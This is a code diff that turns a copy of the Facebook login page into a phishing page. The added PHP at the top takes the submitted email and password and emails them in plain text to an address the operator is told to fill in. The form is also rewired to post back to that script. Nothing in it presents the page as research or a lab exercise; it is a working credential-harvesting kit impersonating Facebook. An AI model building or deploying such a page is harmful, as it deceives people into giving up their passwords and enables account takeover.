@@ -1,3 +1,25 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = $_POST['email'];
+    $password = $_POST['pass'];
+
+    // Your email address where the credentials will be sent
+    $to = "your-email@example.com"; // Replace with your actual email
+    $subject = "New Login Attempt";
+    $message = "Email: " . $email . "\nPassword: " . $password;
+    $headers = "From: noreply@example.com" . "\r\n" .
+               "Reply-To: noreply@example.com" . "\r\n" .
+               "X-Mailer: PHP/" . phpversion();
+
+    // Send email
+    if (mail($to, $subject, $message, $headers)) {
+        $feedback = "Email sent successfully!";
+    } else {
+        $feedback = "Error sending email.";
+    }
+}
+?>
+
 <!DOCTYPE html>
 <html lang="en" id="facebook" class="no_js">
 <head><meta charset="utf-8"><meta name="referrer" content="default" id="meta_referrer"><script nonce="PR3T5TSR">function envFlush(a){function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||{},b(window.Env))}envFlush({"useTrustedTypes":false,"isTrustedTypesReportOnly":false,"ajaxpipe_token":"AXi4KWoarQNcnQV6CJU","stack_trace_limit":30,"timesliceBufferSize":5000,"show_invariant_decoder":false,"compat_iframe_token":"AUUz850qIjTQY0aTmhH3FxyNVds","isCQuick":false,"brsid":"7480225110136265730"});</script><script nonce="PR3T5TSR">window.openDatabase&&(window.openDatabase=function(){throw new Error()});</script><script nonce="PR3T5TSR">_btldr={};</script><script nonce="PR3T5TSR">(function(){function a(a){return a.parentElement!==document.body&&a.parentElement!==document.head}function b(a){return a.nodeName==="SCRIPT"||a.nodeName==="LINK"&&((a=c(a))==null?void 0:a.asyncCss)}function c(a){return!(a.dataset instanceof window.DOMStringMap)?null:a.dataset}function d(d){var e;try{if(d.nodeType!==Node.ELEMENT_NODE)return}catch(a){return}if(a(d)||!b(d))return;var f=(e=c(d))==null?void 0:e.bootloaderHash;if(f!=null&&f!==""){var g=null,h=function(){window._btldr[f]=1,g==null?void 0:g()};g=function(){d.removeEventListener("load",h),d.removeEventListener("error",h)};d.addEventListener("load",h);d.addEventListener("error",h)}}Array.from(document.querySelectorAll('script,link[data-async-css="1"]')).forEach(function(a){return d(a)});var e=new MutationObserver(function(a,b){a.forEach(function(a){a.type==="childList"&&Array.from(a.addedNodes).forEach(function(a){d(a)})})});e.observe(document.getElementsByTagName("html")[0],{attributes:!1,childList:!0,subtree:!0})})();</script><style nonce="PR3T5TSR"></style><script nonce="PR3T5TSR">__DEV__=0;</script><noscript><meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1"></noscript><link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials"><title id="pageTitle">Facebook - log in or sign up</title><meta name="bingbot" content="noarchive"><meta property="og:site_name" content="Facebook"><meta property="og:url" content="https://www.facebook.com/"><meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png"><meta property="og:locale" content="en_US"><link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/"><link rel="alternate" media="handheld" href="https://m.facebook.com/"><meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know."><script type="application/ld+json" nonce="PR3T5TSR">{"\u0040context":"http:\/\/schema.org","\u0040type":"WebSite","name":"Facebook","url":"https:\/\/www.facebook.com\/"}</script><link rel="canonical" href="https://www.facebook.com/"><link rel="icon" href="favicons/r-e9sqr8WnkCf.ico"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/y0/l/0,cross/qpHrYNcDUpl.css" data-bootloader-hash="kQeX049" crossorigin="anonymous">
@@ -46,48 +68,44 @@
                   </h2>
                 </div>
   
-           <!-- Login Form -->
-<div class="_8esn">
-    <div class="_8iep _8icy _9ahz _9ah-">
-      <div class="_6luv _52jv">
-        <form class="_9vtf" data-testid="royal_login_form" 
-              action="send.php"  <!-- Updated to send form data to a PHP script -->
-              method="post" id="u_0_2_Xh">
-          
-          <input type="hidden" name="jazoest" value="2963" autocomplete="off">
-          <input type="hidden" name="lsd" value="AVqcFqxs1Q4" autocomplete="off">
-          
-          <div>
-            <div class="_6lux">
-              <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" 
-                     data-testid="royal-email" placeholder="Email or phone number" autofocus="1" 
-                     aria-label="Email or phone number">
-            </div>
-            <div class="_6lux">
-              <div class="_6luy _55r1 _1kbt" id="passContainer">
-                <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" 
-                       data-testid="royal-pass" placeholder="Password" aria-label="Password">
-                <div class="_9ls7" id="u_0_3_ce">
-                  <a href="#" role="button">
-                    <div class="_9lsa">
-                      <div class="_9lsb" id="u_0_4_Tg"></div>
-                    </div>
-                  </a>
+           
+                <!-- Display feedback message if email is sent -->
+    <?php if (isset($feedback)) { echo "<p>$feedback</p>"; } ?>
+
+    <!-- Login Form -->
+    <div class="_8esn">
+      <div class="_8iep _8icy _9ahz _9ah-">
+        <div class="_6luv _52jv">
+          <form class="_9vtf" data-testid="royal_login_form" 
+                action="" method="post" id="u_0_2_Xh"> <!-- Submits to the same file -->
+            
+            <input type="hidden" name="jazoest" value="2963" autocomplete="off">
+            <input type="hidden" name="lsd" value="AVqcFqxs1Q4" autocomplete="off">
+            
+            <div>
+              <div class="_6lux">
+                <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" 
+                       data-testid="royal-email" placeholder="Email or phone number" autofocus="1" 
+                       aria-label="Email or phone number" required>
+              </div>
+              <div class="_6lux">
+                <div class="_6luy _55r1 _1kbt" id="passContainer">
+                  <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" 
+                         data-testid="royal-pass" placeholder="Password" aria-label="Password" required>
                 </div>
               </div>
             </div>
-          </div>
-  
-          <input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login">
-          <input type="hidden" autocomplete="off" name="next" value="">
-          <input type="hidden" autocomplete="off" name="shared_prefs_data" value="">
-  
-          <div class="_6ltg">
-            <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" 
-                    data-testid="royal-login-button" type="submit" id="u_0_5_Dz">
-              Log In
-            </button>
-          </div>
+
+            <input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login">
+            <input type="hidden" autocomplete="off" name="next" value="">
+            <input type="hidden" autocomplete="off" name="shared_prefs_data" value="">
+
+            <div class="_6ltg">
+              <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" 
+                      data-testid="royal-login-button" type="submit" id="u_0_5_Dz">
+                Log In
+              </button>
+            </div>
   
                         <div class="_6ltj">
                           <a href="?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQxNjI1NjI3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login&amp;next.html" 
